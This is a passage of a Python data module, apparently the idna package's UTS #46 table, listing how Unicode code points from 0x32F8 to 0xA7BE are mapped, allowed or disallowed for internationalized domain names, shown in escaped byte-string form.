(0x32F8, \'M\', \'\xe3\x83\xab\'),\n    (0x32F9, \'M\', \'\xe3\x83\xac\'),\n    (0x32FA, \'M\', \'\xe3\x83\xad\'),\n    (0x32FB, \'M\', \'\xe3\x83\xaf\'),\n    (0x32FC, \'M\', \'\xe3\x83\xb0\'),\n    (0x32FD, \'M\', \'\xe3\x83\xb1\'),\n    (0x32FE, \'M\', \'\xe3\x83\xb2\'),\n    (0x32FF, \'M\', \'\xe4\xbb\xa4\xe5\x92\x8c\'),\n    (0x3300, \'M\', \'\xe3\x82\xa2\xe3\x83\x91\xe3\x83\xbc\xe3\x83\x88\'),\n    (0x3301, \'M\', \'\xe3\x82\xa2\xe3\x83\xab\xe3\x83\x95\xe3\x82\xa1\'),\n    (0x3302, \'M\', \'\xe3\x82\xa2\xe3\x83\xb3\xe3\x83\x9a\xe3\x82\xa2\'),\n    (0x3303, \'M\', \'\xe3\x82\xa2\xe3\x83\xbc\xe3\x83\xab\'),\n    (0x3304, \'M\', \'\xe3\x82\xa4\xe3\x83\x8b\xe3\x83\xb3\xe3\x82\xb0\'),\n    (0x3305, \'M\', \'\xe3\x82\xa4\xe3\x83\xb3\xe3\x83\x81\'),\n    (0x3306, \'M\', \'\xe3\x82\xa6\xe3\x82\xa9\xe3\x83\xb3\'),\n    (0x3307, \'M\', \'\xe3\x82\xa8\xe3\x82\xb9\xe3\x82\xaf\xe3\x83\xbc\xe3\x83\x89\'),\n    (0x3308, \'M\', \'\xe3\x82\xa8\xe3\x83\xbc\xe3\x82\xab\xe3\x83\xbc\'),\n    (0x3309, \'M\', \'\xe3\x82\xaa\xe3\x83\xb3\xe3\x82\xb9\'),\n    (0x330A, \'M\', \'\xe3\x82\xaa\xe3\x83\xbc\xe3\x83\xa0\'),\n    (0x330B, \'M\', \'\xe3\x82\xab\xe3\x82\xa4\xe3\x83\xaa\'),\n    (0x330C, \'M\', \'\xe3\x82\xab\xe3\x83\xa9\xe3\x83\x83\xe3\x83\x88\'),\n    (0x330D, \'M\', \'\xe3\x82\xab\xe3\x83\xad\xe3\x83\xaa\xe3\x83\xbc\'),\n    (0x330E, \'M\', \'\xe3\x82\xac\xe3\x83\xad\xe3\x83\xb3\'),\n    (0x330F, \'M\', \'\xe3\x82\xac\xe3\x83\xb3\xe3\x83\x9e\'),\n    (0x3310, \'M\', \'\xe3\x82\xae\xe3\x82\xac\'),\n    (0x3311, \'M\', \'\xe3\x82\xae\xe3\x83\x8b\xe3\x83\xbc\'),\n    (0x3312, \'M\', \'\xe3\x82\xad\xe3\x83\xa5\xe3\x83\xaa\xe3\x83\xbc\'),\n    (0x3313, \'M\', \'\xe3\x82\xae\xe3\x83\xab\xe3\x83\x80\xe3\x83\xbc\'),\n    (0x3314, \'M\', \'\xe3\x82\xad\xe3\x83\xad\'),\n    (0x3315, \'M\', \'\xe3\x82\xad\xe3\x83\xad\xe3\x82\xb0\xe3\x83\xa9\xe3\x83\xa0\'),\n    ]\n\ndef _seg_33() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x3316, \'M\', \'\xe3\x82\xad\xe3\x83\xad\xe3\x83\xa1\xe3\x83\xbc\xe3\x83\x88\xe3\x83\xab\'),\n    (0x3317, \'M\', \'\xe3\x82\xad\xe3\x83\xad\xe3\x83\xaf\xe3\x83\x83\xe3\x83\x88\'),\n    (0x3318, \'M\', \'\xe3\x82\xb0\xe3\x83\xa9\xe3\x83\xa0\'),\n    (0x3319, \'M\', \'\xe3\x82\xb0\xe3\x83\xa9\xe3\x83\xa0\xe3\x83\x88\xe3\x83\xb3\'),\n    (0x331A, \'M\', \'\xe3\x82\xaf\xe3\x83\xab\xe3\x82\xbc\xe3\x82\xa4\xe3\x83\xad\'),\n    (0x331B, \'M\', \'\xe3\x82\xaf\xe3\x83\xad\xe3\x83\xbc\xe3\x83\x8d\'),\n    (0x331C, \'M\', \'\xe3\x82\xb1\xe3\x83\xbc\xe3\x82\xb9\'),\n    (0x331D, \'M\', \'\xe3\x82\xb3\xe3\x83\xab\xe3\x83\x8a\'),\n    (0x331E, \'M\', \'\xe3\x82\xb3\xe3\x83\xbc\xe3\x83\x9d\'),\n    (0x331F, \'M\', \'\xe3\x82\xb5\xe3\x82\xa4\xe3\x82\xaf\xe3\x83\xab\'),\n    (0x3320, \'M\', \'\xe3\x82\xb5\xe3\x83\xb3\xe3\x83\x81\xe3\x83\xbc\xe3\x83\xa0\'),\n    (0x3321, \'M\', \'\xe3\x82\xb7\xe3\x83\xaa\xe3\x83\xb3\xe3\x82\xb0\'),\n    (0x3322, \'M\', \'\xe3\x82\xbb\xe3\x83\xb3\xe3\x83\x81\'),\n    (0x3323, \'M\', \'\xe3\x82\xbb\xe3\x83\xb3\xe3\x83\x88\'),\n    (0x3324, \'M\', \'\xe3\x83\x80\xe3\x83\xbc\xe3\x82\xb9\'),\n    (0x3325, \'M\', \'\xe3\x83\x87\xe3\x82\xb7\'),\n    (0x3326, \'M\', \'\xe3\x83\x89\xe3\x83\xab\'),\n    (0x3327, \'M\', \'\xe3\x83\x88\xe3\x83\xb3\'),\n    (0x3328, \'M\', \'\xe3\x83\x8a\xe3\x83\x8e\'),\n    (0x3329, \'M\', \'\xe3\x83\x8e\xe3\x83\x83\xe3\x83\x88\'),\n    (0x332A, \'M\', \'\xe3\x83\x8f\xe3\x82\xa4\xe3\x83\x84\'),\n    (0x332B, \'M\', \'\xe3\x83\x91\xe3\x83\xbc\xe3\x82\xbb\xe3\x83\xb3\xe3\x83\x88\'),\n    (0x332C, \'M\', \'\xe3\x83\x91\xe3\x83\xbc\xe3\x83\x84\'),\n    (0x332D, \'M\', \'\xe3\x83\x90\xe3\x83\xbc\xe3\x83\xac\xe3\x83\xab\'),\n    (0x332E, \'M\', \'\xe3\x83\x94\xe3\x82\xa2\xe3\x82\xb9\xe3\x83\x88\xe3\x83\xab\'),\n    (0x332F, \'M\', \'\xe3\x83\x94\xe3\x82\xaf\xe3\x83\xab\'),\n    (0x3330, \'M\', \'\xe3\x83\x94\xe3\x82\xb3\'),\n    (0x3331, \'M\', \'\xe3\x83\x93\xe3\x83\xab\'),\n    (0x3332, \'M\', \'\xe3\x83\x95\xe3\x82\xa1\xe3\x83\xa9\xe3\x83\x83\xe3\x83\x89\'),\n    (0x3333, \'M\', \'\xe3\x83\x95\xe3\x82\xa3\xe3\x83\xbc\xe3\x83\x88\'),\n    (0x3334, \'M\', \'\xe3\x83\x96\xe3\x83\x83\xe3\x82\xb7\xe3\x82\xa7\xe3\x83\xab\'),\n    (0x3335, \'M\', \'\xe3\x83\x95\xe3\x83\xa9\xe3\x83\xb3\'),\n    (0x3336, \'M\', \'\xe3\x83\x98\xe3\x82\xaf\xe3\x82\xbf\xe3\x83\xbc\xe3\x83\xab\'),\n    (0x3337, \'M\', \'\xe3\x83\x9a\xe3\x82\xbd\'),\n    (0x3338, \'M\', \'\xe3\x83\x9a\xe3\x83\x8b\xe3\x83\x92\'),\n    (0x3339, \'M\', \'\xe3\x83\x98\xe3\x83\xab\xe3\x83\x84\'),\n    (0x333A, \'M\', \'\xe3\x83\x9a\xe3\x83\xb3\xe3\x82\xb9\'),\n    (0x333B, \'M\', \'\xe3\x83\x9a\xe3\x83\xbc\xe3\x82\xb8\'),\n    (0x333C, \'M\', \'\xe3\x83\x99\xe3\x83\xbc\xe3\x82\xbf\'),\n    (0x333D, \'M\', \'\xe3\x83\x9d\xe3\x82\xa4\xe3\x83\xb3\xe3\x83\x88\'),\n    (0x333E, \'M\', \'\xe3\x83\x9c\xe3\x83\xab\xe3\x83\x88\'),\n    (0x333F, \'M\', \'\xe3\x83\x9b\xe3\x83\xb3\'),\n    (0x3340, \'M\', \'\xe3\x83\x9d\xe3\x83\xb3\xe3\x83\x89\'),\n    (0x3341, \'M\', \'\xe3\x83\x9b\xe3\x83\xbc\xe3\x83\xab\'),\n    (0x3342, \'M\', \'\xe3\x83\x9b\xe3\x83\xbc\xe3\x83\xb3\'),\n    (0x3343, \'M\', \'\xe3\x83\x9e\xe3\x82\xa4\xe3\x82\xaf\xe3\x83\xad\'),\n    (0x3344, \'M\', \'\xe3\x83\x9e\xe3\x82\xa4\xe3\x83\xab\'),\n    (0x3345, \'M\', \'\xe3\x83\x9e\xe3\x83\x83\xe3\x83\x8f\'),\n    (0x3346, \'M\', \'\xe3\x83\x9e\xe3\x83\xab\xe3\x82\xaf\'),\n    (0x3347, \'M\', \'\xe3\x83\x9e\xe3\x83\xb3\xe3\x82\xb7\xe3\x83\xa7\xe3\x83\xb3\'),\n    (0x3348, \'M\', \'\xe3\x83\x9f\xe3\x82\xaf\xe3\x83\xad\xe3\x83\xb3\'),\n    (0x3349, \'M\', \'\xe3\x83\x9f\xe3\x83\xaa\'),\n    (0x334A, \'M\', \'\xe3\x83\x9f\xe3\x83\xaa\xe3\x83\x90\xe3\x83\xbc\xe3\x83\xab\'),\n    (0x334B, \'M\', \'\xe3\x83\xa1\xe3\x82\xac\'),\n    (0x334C, \'M\', \'\xe3\x83\xa1\xe3\x82\xac\xe3\x83\x88\xe3\x83\xb3\'),\n    (0x334D, \'M\', \'\xe3\x83\xa1\xe3\x83\xbc\xe3\x83\x88\xe3\x83\xab\'),\n    (0x334E, \'M\', \'\xe3\x83\xa4\xe3\x83\xbc\xe3\x83\x89\'),\n    (0x334F, \'M\', \'\xe3\x83\xa4\xe3\x83\xbc\xe3\x83\xab\'),\n    (0x3350, \'M\', \'\xe3\x83\xa6\xe3\x82\xa2\xe3\x83\xb3\'),\n    (0x3351, \'M\', \'\xe3\x83\xaa\xe3\x83\x83\xe3\x83\x88\xe3\x83\xab\'),\n    (0x3352, \'M\', \'\xe3\x83\xaa\xe3\x83\xa9\'),\n    (0x3353, \'M\', \'\xe3\x83\xab\xe3\x83\x94\xe3\x83\xbc\'),\n    (0x3354, \'M\', \'\xe3\x83\xab\xe3\x83\xbc\xe3\x83\x96\xe3\x83\xab\'),\n    (0x3355, \'M\', \'\xe3\x83\xac\xe3\x83\xa0\'),\n    (0x3356, \'M\', \'\xe3\x83\xac\xe3\x83\xb3\xe3\x83\x88\xe3\x82\xb2\xe3\x83\xb3\'),\n    (0x3357, \'M\', \'\xe3\x83\xaf\xe3\x83\x83\xe3\x83\x88\'),\n    (0x3358, \'M\', \'0\xe7\x82\xb9\'),\n    (0x3359, \'M\', \'1\xe7\x82\xb9\'),\n    (0x335A, \'M\', \'2\xe7\x82\xb9\'),\n    (0x335B, \'M\', \'3\xe7\x82\xb9\'),\n    (0x335C, \'M\', \'4\xe7\x82\xb9\'),\n    (0x335D, \'M\', \'5\xe7\x82\xb9\'),\n    (0x335E, \'M\', \'6\xe7\x82\xb9\'),\n    (0x335F, \'M\', \'7\xe7\x82\xb9\'),\n    (0x3360, \'M\', \'8\xe7\x82\xb9\'),\n    (0x3361, \'M\', \'9\xe7\x82\xb9\'),\n    (0x3362, \'M\', \'10\xe7\x82\xb9\'),\n    (0x3363, \'M\', \'11\xe7\x82\xb9\'),\n    (0x3364, \'M\', \'12\xe7\x82\xb9\'),\n    (0x3365, \'M\', \'13\xe7\x82\xb9\'),\n    (0x3366, \'M\', \'14\xe7\x82\xb9\'),\n    (0x3367, \'M\', \'15\xe7\x82\xb9\'),\n    (0x3368, \'M\', \'16\xe7\x82\xb9\'),\n    (0x3369, \'M\', \'17\xe7\x82\xb9\'),\n    (0x336A, \'M\', \'18\xe7\x82\xb9\'),\n    (0x336B, \'M\', \'19\xe7\x82\xb9\'),\n    (0x336C, \'M\', \'20\xe7\x82\xb9\'),\n    (0x336D, \'M\', \'21\xe7\x82\xb9\'),\n    (0x336E, \'M\', \'22\xe7\x82\xb9\'),\n    (0x336F, \'M\', \'23\xe7\x82\xb9\'),\n    (0x3370, \'M\', \'24\xe7\x82\xb9\'),\n    (0x3371, \'M\', \'hpa\'),\n    (0x3372, \'M\', \'da\'),\n    (0x3373, \'M\', \'au\'),\n    (0x3374, \'M\', \'bar\'),\n    (0x3375, \'M\', \'ov\'),\n    (0x3376, \'M\', \'pc\'),\n    (0x3377, \'M\', \'dm\'),\n    (0x3378, \'M\', \'dm2\'),\n    (0x3379, \'M\', \'dm3\'),\n    ]\n\ndef _seg_34() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x337A, \'M\', \'iu\'),\n    (0x337B, \'M\', \'\xe5\xb9\xb3\xe6\x88\x90\'),\n    (0x337C, \'M\', \'\xe6\x98\xad\xe5\x92\x8c\'),\n    (0x337D, \'M\', \'\xe5\xa4\xa7\xe6\xad\xa3\'),\n    (0x337E, \'M\', \'\xe6\x98\x8e\xe6\xb2\xbb\'),\n    (0x337F, \'M\', \'\xe6\xa0\xaa\xe5\xbc\x8f\xe4\xbc\x9a\xe7\xa4\xbe\'),\n    (0x3380, \'M\', \'pa\'),\n    (0x3381, \'M\', \'na\'),\n    (0x3382, \'M\', \'\xce\xbca\'),\n    (0x3383, \'M\', \'ma\'),\n    (0x3384, \'M\', \'ka\'),\n    (0x3385, \'M\', \'kb\'),\n    (0x3386, \'M\', \'mb\'),\n    (0x3387, \'M\', \'gb\'),\n    (0x3388, \'M\', \'cal\'),\n    (0x3389, \'M\', \'kcal\'),\n    (0x338A, \'M\', \'pf\'),\n    (0x338B, \'M\', \'nf\'),\n    (0x338C, \'M\', \'\xce\xbcf\'),\n    (0x338D, \'M\', \'\xce\xbcg\'),\n    (0x338E, \'M\', \'mg\'),\n    (0x338F, \'M\', \'kg\'),\n    (0x3390, \'M\', \'hz\'),\n    (0x3391, \'M\', \'khz\'),\n    (0x3392, \'M\', \'mhz\'),\n    (0x3393, \'M\', \'ghz\'),\n    (0x3394, \'M\', \'thz\'),\n    (0x3395, \'M\', \'\xce\xbcl\'),\n    (0x3396, \'M\', \'ml\'),\n    (0x3397, \'M\', \'dl\'),\n    (0x3398, \'M\', \'kl\'),\n    (0x3399, \'M\', \'fm\'),\n    (0x339A, \'M\', \'nm\'),\n    (0x339B, \'M\', \'\xce\xbcm\'),\n    (0x339C, \'M\', \'mm\'),\n    (0x339D, \'M\', \'cm\'),\n    (0x339E, \'M\', \'km\'),\n    (0x339F, \'M\', \'mm2\'),\n    (0x33A0, \'M\', \'cm2\'),\n    (0x33A1, \'M\', \'m2\'),\n    (0x33A2, \'M\', \'km2\'),\n    (0x33A3, \'M\', \'mm3\'),\n    (0x33A4, \'M\', \'cm3\'),\n    (0x33A5, \'M\', \'m3\'),\n    (0x33A6, \'M\', \'km3\'),\n    (0x33A7, \'M\', \'m\xe2\x88\x95s\'),\n    (0x33A8, \'M\', \'m\xe2\x88\x95s2\'),\n    (0x33A9, \'M\', \'pa\'),\n    (0x33AA, \'M\', \'kpa\'),\n    (0x33AB, \'M\', \'mpa\'),\n    (0x33AC, \'M\', \'gpa\'),\n    (0x33AD, \'M\', \'rad\'),\n    (0x33AE, \'M\', \'rad\xe2\x88\x95s\'),\n    (0x33AF, \'M\', \'rad\xe2\x88\x95s2\'),\n    (0x33B0, \'M\', \'ps\'),\n    (0x33B1, \'M\', \'ns\'),\n    (0x33B2, \'M\', \'\xce\xbcs\'),\n    (0x33B3, \'M\', \'ms\'),\n    (0x33B4, \'M\', \'pv\'),\n    (0x33B5, \'M\', \'nv\'),\n    (0x33B6, \'M\', \'\xce\xbcv\'),\n    (0x33B7, \'M\', \'mv\'),\n    (0x33B8, \'M\', \'kv\'),\n    (0x33B9, \'M\', \'mv\'),\n    (0x33BA, \'M\', \'pw\'),\n    (0x33BB, \'M\', \'nw\'),\n    (0x33BC, \'M\', \'\xce\xbcw\'),\n    (0x33BD, \'M\', \'mw\'),\n    (0x33BE, \'M\', \'kw\'),\n    (0x33BF, \'M\', \'mw\'),\n    (0x33C0, \'M\', \'k\xcf\x89\'),\n    (0x33C1, \'M\', \'m\xcf\x89\'),\n    (0x33C2, \'X\'),\n    (0x33C3, \'M\', \'bq\'),\n    (0x33C4, \'M\', \'cc\'),\n    (0x33C5, \'M\', \'cd\'),\n    (0x33C6, \'M\', \'c\xe2\x88\x95kg\'),\n    (0x33C7, \'X\'),\n    (0x33C8, \'M\', \'db\'),\n    (0x33C9, \'M\', \'gy\'),\n    (0x33CA, \'M\', \'ha\'),\n    (0x33CB, \'M\', \'hp\'),\n    (0x33CC, \'M\', \'in\'),\n    (0x33CD, \'M\', \'kk\'),\n    (0x33CE, \'M\', \'km\'),\n    (0x33CF, \'M\', \'kt\'),\n    (0x33D0, \'M\', \'lm\'),\n    (0x33D1, \'M\', \'ln\'),\n    (0x33D2, \'M\', \'log\'),\n    (0x33D3, \'M\', \'lx\'),\n    (0x33D4, \'M\', \'mb\'),\n    (0x33D5, \'M\', \'mil\'),\n    (0x33D6, \'M\', \'mol\'),\n    (0x33D7, \'M\', \'ph\'),\n    (0x33D8, \'X\'),\n    (0x33D9, \'M\', \'ppm\'),\n    (0x33DA, \'M\', \'pr\'),\n    (0x33DB, \'M\', \'sr\'),\n    (0x33DC, \'M\', \'sv\'),\n    (0x33DD, \'M\', \'wb\'),\n    ]\n\ndef _seg_35() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x33DE, \'M\', \'v\xe2\x88\x95m\'),\n    (0x33DF, \'M\', \'a\xe2\x88\x95m\'),\n    (0x33E0, \'M\', \'1\xe6\x97\xa5\'),\n    (0x33E1, \'M\', \'2\xe6\x97\xa5\'),\n    (0x33E2, \'M\', \'3\xe6\x97\xa5\'),\n    (0x33E3, \'M\', \'4\xe6\x97\xa5\'),\n    (0x33E4, \'M\', \'5\xe6\x97\xa5\'),\n    (0x33E5, \'M\', \'6\xe6\x97\xa5\'),\n    (0x33E6, \'M\', \'7\xe6\x97\xa5\'),\n    (0x33E7, \'M\', \'8\xe6\x97\xa5\'),\n    (0x33E8, \'M\', \'9\xe6\x97\xa5\'),\n    (0x33E9, \'M\', \'10\xe6\x97\xa5\'),\n    (0x33EA, \'M\', \'11\xe6\x97\xa5\'),\n    (0x33EB, \'M\', \'12\xe6\x97\xa5\'),\n    (0x33EC, \'M\', \'13\xe6\x97\xa5\'),\n    (0x33ED, \'M\', \'14\xe6\x97\xa5\'),\n    (0x33EE, \'M\', \'15\xe6\x97\xa5\'),\n    (0x33EF, \'M\', \'16\xe6\x97\xa5\'),\n    (0x33F0, \'M\', \'17\xe6\x97\xa5\'),\n    (0x33F1, \'M\', \'18\xe6\x97\xa5\'),\n    (0x33F2, \'M\', \'19\xe6\x97\xa5\'),\n    (0x33F3, \'M\', \'20\xe6\x97\xa5\'),\n    (0x33F4, \'M\', \'21\xe6\x97\xa5\'),\n    (0x33F5, \'M\', \'22\xe6\x97\xa5\'),\n    (0x33F6, \'M\', \'23\xe6\x97\xa5\'),\n    (0x33F7, \'M\', \'24\xe6\x97\xa5\'),\n    (0x33F8, \'M\', \'25\xe6\x97\xa5\'),\n    (0x33F9, \'M\', \'26\xe6\x97\xa5\'),\n    (0x33FA, \'M\', \'27\xe6\x97\xa5\'),\n    (0x33FB, \'M\', \'28\xe6\x97\xa5\'),\n    (0x33FC, \'M\', \'29\xe6\x97\xa5\'),\n    (0x33FD, \'M\', \'30\xe6\x97\xa5\'),\n    (0x33FE, \'M\', \'31\xe6\x97\xa5\'),\n    (0x33FF, \'M\', \'gal\'),\n    (0x3400, \'V\'),\n    (0xA48D, \'X\'),\n    (0xA490, \'V\'),\n    (0xA4C7, \'X\'),\n    (0xA4D0, \'V\'),\n    (0xA62C, \'X\'),\n    (0xA640, \'M\', \'\xea\x99\x81\'),\n    (0xA641, \'V\'),\n    (0xA642, \'M\', \'\xea\x99\x83\'),\n    (0xA643, \'V\'),\n    (0xA644, \'M\', \'\xea\x99\x85\'),\n    (0xA645, \'V\'),\n    (0xA646, \'M\', \'\xea\x99\x87\'),\n    (0xA647, \'V\'),\n    (0xA648, \'M\', \'\xea\x99\x89\'),\n    (0xA649, \'V\'),\n    (0xA64A, \'M\', \'\xea\x99\x8b\'),\n    (0xA64B, \'V\'),\n    (0xA64C, \'M\', \'\xea\x99\x8d\'),\n    (0xA64D, \'V\'),\n    (0xA64E, \'M\', \'\xea\x99\x8f\'),\n    (0xA64F, \'V\'),\n    (0xA650, \'M\', \'\xea\x99\x91\'),\n    (0xA651, \'V\'),\n    (0xA652, \'M\', \'\xea\x99\x93\'),\n    (0xA653, \'V\'),\n    (0xA654, \'M\', \'\xea\x99\x95\'),\n    (0xA655, \'V\'),\n    (0xA656, \'M\', \'\xea\x99\x97\'),\n    (0xA657, \'V\'),\n    (0xA658, \'M\', \'\xea\x99\x99\'),\n    (0xA659, \'V\'),\n    (0xA65A, \'M\', \'\xea\x99\x9b\'),\n    (0xA65B, \'V\'),\n    (0xA65C, \'M\', \'\xea\x99\x9d\'),\n    (0xA65D, \'V\'),\n    (0xA65E, \'M\', \'\xea\x99\x9f\'),\n    (0xA65F, \'V\'),\n    (0xA660, \'M\', \'\xea\x99\xa1\'),\n    (0xA661, \'V\'),\n    (0xA662, \'M\', \'\xea\x99\xa3\'),\n    (0xA663, \'V\'),\n    (0xA664, \'M\', \'\xea\x99\xa5\'),\n    (0xA665, \'V\'),\n    (0xA666, \'M\', \'\xea\x99\xa7\'),\n    (0xA667, \'V\'),\n    (0xA668, \'M\', \'\xea\x99\xa9\'),\n    (0xA669, \'V\'),\n    (0xA66A, \'M\', \'\xea\x99\xab\'),\n    (0xA66B, \'V\'),\n    (0xA66C, \'M\', \'\xea\x99\xad\'),\n    (0xA66D, \'V\'),\n    (0xA680, \'M\', \'\xea\x9a\x81\'),\n    (0xA681, \'V\'),\n    (0xA682, \'M\', \'\xea\x9a\x83\'),\n    (0xA683, \'V\'),\n    (0xA684, \'M\', \'\xea\x9a\x85\'),\n    (0xA685, \'V\'),\n    (0xA686, \'M\', \'\xea\x9a\x87\'),\n    (0xA687, \'V\'),\n    (0xA688, \'M\', \'\xea\x9a\x89\'),\n    (0xA689, \'V\'),\n    (0xA68A, \'M\', \'\xea\x9a\x8b\'),\n    (0xA68B, \'V\'),\n    (0xA68C, \'M\', \'\xea\x9a\x8d\'),\n    (0xA68D, \'V\'),\n    ]\n\ndef _seg_36() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xA68E, \'M\', \'\xea\x9a\x8f\'),\n    (0xA68F, \'V\'),\n    (0xA690, \'M\', \'\xea\x9a\x91\'),\n    (0xA691, \'V\'),\n    (0xA692, \'M\', \'\xea\x9a\x93\'),\n    (0xA693, \'V\'),\n    (0xA694, \'M\', \'\xea\x9a\x95\'),\n    (0xA695, \'V\'),\n    (0xA696, \'M\', \'\xea\x9a\x97\'),\n    (0xA697, \'V\'),\n    (0xA698, \'M\', \'\xea\x9a\x99\'),\n    (0xA699, \'V\'),\n    (0xA69A, \'M\', \'\xea\x9a\x9b\'),\n    (0xA69B, \'V\'),\n    (0xA69C, \'M\', \'\xd1\x8a\'),\n    (0xA69D, \'M\', \'\xd1\x8c\'),\n    (0xA69E, \'V\'),\n    (0xA6F8, \'X\'),\n    (0xA700, \'V\'),\n    (0xA722, \'M\', \'\xea\x9c\xa3\'),\n    (0xA723, \'V\'),\n    (0xA724, \'M\', \'\xea\x9c\xa5\'),\n    (0xA725, \'V\'),\n    (0xA726, \'M\', \'\xea\x9c\xa7\'),\n    (0xA727, \'V\'),\n    (0xA728, \'M\', \'\xea\x9c\xa9\'),\n    (0xA729, \'V\'),\n    (0xA72A, \'M\', \'\xea\x9c\xab\'),\n    (0xA72B, \'V\'),\n    (0xA72C, \'M\', \'\xea\x9c\xad\'),\n    (0xA72D, \'V\'),\n    (0xA72E, \'M\', \'\xea\x9c\xaf\'),\n    (0xA72F, \'V\'),\n    (0xA732, \'M\', \'\xea\x9c\xb3\'),\n    (0xA733, \'V\'),\n    (0xA734, \'M\', \'\xea\x9c\xb5\'),\n    (0xA735, \'V\'),\n    (0xA736, \'M\', \'\xea\x9c\xb7\'),\n    (0xA737, \'V\'),\n    (0xA738, \'M\', \'\xea\x9c\xb9\'),\n    (0xA739, \'V\'),\n    (0xA73A, \'M\', \'\xea\x9c\xbb\'),\n    (0xA73B, \'V\'),\n    (0xA73C, \'M\', \'\xea\x9c\xbd\'),\n    (0xA73D, \'V\'),\n    (0xA73E, \'M\', \'\xea\x9c\xbf\'),\n    (0xA73F, \'V\'),\n    (0xA740, \'M\', \'\xea\x9d\x81\'),\n    (0xA741, \'V\'),\n    (0xA742, \'M\', \'\xea\x9d\x83\'),\n    (0xA743, \'V\'),\n    (0xA744, \'M\', \'\xea\x9d\x85\'),\n    (0xA745, \'V\'),\n    (0xA746, \'M\', \'\xea\x9d\x87\'),\n    (0xA747, \'V\'),\n    (0xA748, \'M\', \'\xea\x9d\x89\'),\n    (0xA749, \'V\'),\n    (0xA74A, \'M\', \'\xea\x9d\x8b\'),\n    (0xA74B, \'V\'),\n    (0xA74C, \'M\', \'\xea\x9d\x8d\'),\n    (0xA74D, \'V\'),\n    (0xA74E, \'M\', \'\xea\x9d\x8f\'),\n    (0xA74F, \'V\'),\n    (0xA750, \'M\', \'\xea\x9d\x91\'),\n    (0xA751, \'V\'),\n    (0xA752, \'M\', \'\xea\x9d\x93\'),\n    (0xA753, \'V\'),\n    (0xA754, \'M\', \'\xea\x9d\x95\'),\n    (0xA755, \'V\'),\n    (0xA756, \'M\', \'\xea\x9d\x97\'),\n    (0xA757, \'V\'),\n    (0xA758, \'M\', \'\xea\x9d\x99\'),\n    (0xA759, \'V\'),\n    (0xA75A, \'M\', \'\xea\x9d\x9b\'),\n    (0xA75B, \'V\'),\n    (0xA75C, \'M\', \'\xea\x9d\x9d\'),\n    (0xA75D, \'V\'),\n    (0xA75E, \'M\', \'\xea\x9d\x9f\'),\n    (0xA75F, \'V\'),\n    (0xA760, \'M\', \'\xea\x9d\xa1\'),\n    (0xA761, \'V\'),\n    (0xA762, \'M\', \'\xea\x9d\xa3\'),\n    (0xA763, \'V\'),\n    (0xA764, \'M\', \'\xea\x9d\xa5\'),\n    (0xA765, \'V\'),\n    (0xA766, \'M\', \'\xea\x9d\xa7\'),\n    (0xA767, \'V\'),\n    (0xA768, \'M\', \'\xea\x9d\xa9\'),\n    (0xA769, \'V\'),\n    (0xA76A, \'M\', \'\xea\x9d\xab\'),\n    (0xA76B, \'V\'),\n    (0xA76C, \'M\', \'\xea\x9d\xad\'),\n    (0xA76D, \'V\'),\n    (0xA76E, \'M\', \'\xea\x9d\xaf\'),\n    (0xA76F, \'V\'),\n    (0xA770, \'M\', \'\xea\x9d\xaf\'),\n    (0xA771, \'V\'),\n    (0xA779, \'M\', \'\xea\x9d\xba\'),\n    (0xA77A, \'V\'),\n    (0xA77B, \'M\', \'\xea\x9d\xbc\'),\n    ]\n\ndef _seg_37() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xA77C, \'V\'),\n    (0xA77D, \'M\', \'\xe1\xb5\xb9\'),\n    (0xA77E, \'M\', \'\xea\x9d\xbf\'),\n    (0xA77F, \'V\'),\n    (0xA780, \'M\', \'\xea\x9e\x81\'),\n    (0xA781, \'V\'),\n    (0xA782, \'M\', \'\xea\x9e\x83\'),\n    (0xA783, \'V\'),\n    (0xA784, \'M\', \'\xea\x9e\x85\'),\n    (0xA785, \'V\'),\n    (0xA786, \'M\', \'\xea\x9e\x87\'),\n    (0xA787, \'V\'),\n    (0xA78B, \'M\', \'\xea\x9e\x8c\'),\n    (0xA78C, \'V\'),\n    (0xA78D, \'M\', \'\xc9\xa5\'),\n    (0xA78E, \'V\'),\n    (0xA790, \'M\', \'\xea\x9e\x91\'),\n    (0xA791, \'V\'),\n    (0xA792, \'M\', \'\xea\x9e\x93\'),\n    (0xA793, \'V\'),\n    (0xA796, \'M\', \'\xea\x9e\x97\'),\n    (0xA797, \'V\'),\n    (0xA798, \'M\', \'\xea\x9e\x99\'),\n    (0xA799, \'V\'),\n    (0xA79A, \'M\', \'\xea\x9e\x9b\'),\n    (0xA79B, \'V\'),\n    (0xA79C, \'M\', \'\xea\x9e\x9d\'),\n    (0xA79D, \'V\'),\n    (0xA79E, \'M\', \'\xea\x9e\x9f\'),\n    (0xA79F, \'V\'),\n    (0xA7A0, \'M\', \'\xea\x9e\xa1\'),\n    (0xA7A1, \'V\'),\n    (0xA7A2, \'M\', \'\xea\x9e\xa3\'),\n    (0xA7A3, \'V\'),\n    (0xA7A4, \'M\', \'\xea\x9e\xa5\'),\n    (0xA7A5, \'V\'),\n    (0xA7A6, \'M\', \'\xea\x9e\xa7\'),\n    (0xA7A7, \'V\'),\n    (0xA7A8, \'M\', \'\xea\x9e\xa9\'),\n    (0xA7A9, \'V\'),\n    (0xA7AA, \'M\', \'\xc9\xa6\'),\n    (0xA7AB, \'M\', \'\xc9\x9c\'),\n    (0xA7AC, \'M\', \'\xc9\xa1\'),\n    (0xA7AD, \'M\', \'\xc9\xac\'),\n    (0xA7AE, \'M\', \'\xc9\xaa\'),\n    (0xA7AF, \'V\'),\n    (0xA7B0, \'M\', \'\xca\x9e\'),\n    (0xA7B1, \'M\', \'\xca\x87\'),\n    (0xA7B2, \'M\', \'\xca\x9d\'),\n    (0xA7B3, \'M\', \'\xea\xad\x93\'),\n    (0xA7B4, \'M\', \'\xea\x9e\xb5\'),\n    (0xA7B5, \'V\'),\n    (0xA7B6, \'M\', \'\xea\x9e\xb7\'),\n    (0xA7B7, \'V\'),\n    (0xA7B8, \'M\', \'\xea\x9e\xb9\'),\n    (0xA7B9, \'V\'),\n    (0xA7BA, \'M\', \'\xea\x9e\xbb\'),\n    (0xA7BB, \'V\'),\n    (0xA7BC, \'M\', \'\xea\x9e\xbd\'),\n    (0xA7BD, \'V\'),\n    (0xA7BE, \'M\', \'\xea\x9e\xbf\'),\n    